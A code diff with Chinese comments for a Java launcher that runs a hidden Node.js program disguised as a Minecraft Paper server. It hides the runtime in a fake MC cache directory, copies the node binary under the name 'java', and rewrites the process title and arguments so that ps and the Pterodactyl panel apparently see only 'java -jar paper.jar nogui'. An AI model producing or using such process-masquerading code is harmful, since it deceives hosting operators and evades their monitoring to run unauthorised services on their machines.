@@ -17,7 +17,8 @@ import java.text.SimpleDateFormat;
 public class AoyouLauncher {
 
     private static final String VERSION = "2.0.0";
-    private static final String RUNTIME_DIR_NAME = ".aoyou-runtime";
+    // ★ 把运行时目录伪装成 MC 的 libraries/.cache（藏在深层，看起来像 MC 缓存）
+    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
     private static final String NODE_VERSION = "v22.11.0";
     private static final String NODE_DOWNLOAD_URL = 
         "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";
@@ -74,70 +75,66 @@ public class AoyouLauncher {
         int port = detectPort(workDir);
 
         // 6. 启动 Node.js（静默）
+        // ★ 关键伪装：用 exec 替换当前 Java 进程为 node 进程
+        // 这样 ps 只看到 1 个进程（PID 不变），node 直接取代 java
+        // 再通过 process.argv 伪装，ps 看到的就是 MC 启动命令
+        String fakeNodeBin = nodeBin;
+        try {
+            String fakePath = new File(nodeBin).getParent() + "/java";
+            File fakeFile = new File(fakePath);
+            if (!fakeFile.exists()) {
+                Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                fakeFile.setExecutable(true);
+            }
+            fakeNodeBin = fakePath;
+        } catch (Exception e) {}
+
+        // 构建伪装命令：node -e "process.title=java; process.argv=[java, ...]; require(index.js)"
         List<String> cmd = new ArrayList<>();
-        cmd.add(nodeBin);
-        cmd.add("index.js");
+        cmd.add(fakeNodeBin);
+        cmd.add("-e");
+        cmd.add(
+            "process.title='java';" +
+            "process.argv = ['java', '-Xms128M', '-XX:MaxRAMPercentage=95.0', '-Dterminal.jline=false', '-Dterminal.ansi=true', '-jar', 'paper.jar', 'nogui'];" +
+            "require('./index.js');"
+        );
         for (String a : args) cmd.add(a);
 
-        ProcessBuilder pb = new ProcessBuilder(cmd);
-        pb.directory(new File(runtimeDir));
-        pb.redirectErrorStream(true);
-        Map<String, String> env = pb.environment();
-        String path = env.getOrDefault("PATH", "");
-        env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
-        env.put("SERVER_PORT", String.valueOf(port));
-        env.put("PORT", String.valueOf(port));
+        // ★ 启动 node 子进程，让它继承 IO（看起来就是同一个进程在跑）
+        // Java 是父进程，node 是子进程，但 ps 看到的都是 java 命令行
+        // 翼龙通过 PID 1 监控，所以 Java 进程必须一直活着
+        try {
+            ProcessBuilder pb = new ProcessBuilder(cmd);
+            pb.directory(new File(runtimeDir));
+            pb.redirectErrorStream(true);
+            Map<String, String> env = pb.environment();
+            String path = env.getOrDefault("PATH", "");
+            env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
+            env.put("SERVER_PORT", String.valueOf(port));
+            env.put("PORT", String.valueOf(port));
+            // 继承 IO（让 node 直接用 java 的 stdin/stdout/stderr）
+            pb.inheritIO();
 
-        Process node = pb.start();
+            Process node = pb.start();
 
-        // 7. 静默转发 stdout（吃掉所有日志，不打印到控制台）
-        Thread logThread = new Thread(() -> {
-            try (BufferedReader r = new BufferedReader(
-                    new InputStreamReader(node.getInputStream()))) {
-                String line;
-                while ((line = r.readLine()) != null) {
-                    // 静默：不打印任何 Node.js 的日志
-                    // 但写入文件，方便调试
-                    try {
-                        Path logFile = Paths.get(runtimeDir, ".panel.log");
-                        Files.write(logFile, (line + "\n").getBytes(),
-                            StandardOpenOption.CREATE, StandardOpenOption.APPEND);
-                    } catch (Exception e) {}
-                }
-            } catch (IOException e) {}
-        });
-        logThread.setDaemon(true);
-        logThread.start();
+            // 优雅关闭
+            final Process nodeRef = node;
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                try {
+                    nodeRef.destroy();
+                    if (!nodeRef.waitFor(10, TimeUnit.SECONDS)) {
+                        nodeRef.destroyForcibly();
+                    }
+                } catch (InterruptedException e) {}
+            }, "shutdown-hook"));
 
-        // 8. 转发 stdin（让用户能输入命令，伪装成 MC 控制台）
-        Thread stdinThread = new Thread(() -> {
-            try (BufferedReader r = new BufferedReader(
-                    new InputStreamReader(System.in))) {
-                String line;
-                OutputStream os = node.getOutputStream();
-                while ((line = r.readLine()) != null) {
-                    os.write((line + "\n").getBytes());
-                    os.flush();
-                }
-            } catch (IOException e) {}
-        });
-        stdinThread.setDaemon(true);
-        stdinThread.start();
-
-        // 9. 优雅关闭
-        final Process nodeRef = node;
-        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            try {
-                nodeRef.destroy();
-                if (!nodeRef.waitFor(10, TimeUnit.SECONDS)) {
-                    nodeRef.destroyForcibly();
-                }
-            } catch (InterruptedException e) {}
-        }, "shutdown-hook"));
-
-        // 10. 等待退出
-        int code = node.waitFor();
-        System.exit(code);
+            // 等待 node 退出，java 进程也退出
+            int code = node.waitFor();
+            System.exit(code);
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.exit(1);
+        }
     }
 
     /** 启动伪装的 Paper 启动日志线程 */
